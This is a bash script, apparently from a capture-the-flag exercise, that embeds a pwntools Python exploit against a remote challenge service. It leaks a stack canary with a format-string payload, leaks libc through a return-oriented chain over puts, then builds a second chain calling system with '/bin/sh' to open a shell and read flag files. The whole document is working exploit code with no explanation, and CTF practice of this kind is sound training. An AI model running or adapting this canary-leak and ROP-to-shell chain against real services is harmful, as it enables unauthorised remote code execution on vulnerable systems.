#!/bin/bash

# Script para obtener la flag con timeout
cd /workspace/f_one_pwn

echo "Ejecutando exploit contra el servidor remoto..."
timeout 30s python3 -c '
from pwn import *
import sys

context.arch = "amd64"
context.log_level = "error"

elf = ELF("./f_one", checksec=False)

def connect():
    return remote("challenges-box1.pwn.tn", 1111, timeout=10)

# Step 1: Leak canary
print("[*] Leaking canary...", file=sys.stderr)
p = connect()
p.recvuntil(b"give me something:")
p.sendline(b"%13$p")
p.recvline()
leaked = p.recvline().strip()
canary = int(leaked, 16)
print(f"[+] Canary: {hex(canary)}", file=sys.stderr)
p.close()

# Step 2: Leak libc
print("[*] Leaking libc...", file=sys.stderr)
p = connect()
p.recvuntil(b"give me something:")

pop_rdi = 0x4007f3
puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]
main_addr = elf.symbols["main"]

payload = b"A" * 56
payload += p64(canary)
payload += b"B" * 8
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main_addr)

p.sendline(payload)
p.recvline()
leaked_puts = u64(p.recvline().strip().ljust(8, b"\x00"))
print(f"[+] Leaked puts: {hex(leaked_puts)}", file=sys.stderr)

# Calculate libc
libc_puts_offset = 0x809c0
libc_base = leaked_puts - libc_puts_offset
libc_system = libc_base + 0x4f440
libc_binsh = libc_base + 0x1b3e9a

print(f"[+] Libc base: {hex(libc_base)}", file=sys.stderr)

# Step 3: Get shell
print("[*] Getting shell...", file=sys.stderr)
p.recvuntil(b"give me something:")

ret = 0x400566
payload = b"A" * 56
payload += p64(canary)
payload += b"B" * 8
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(libc_binsh)
payload += p64(libc_system)

p.sendline(payload)

# Get flag
p.sendline(b"cat flag.txt; cat flag; ls -la; echo END_FLAG")
print(p.recvall(timeout=5).decode())
p.close()
'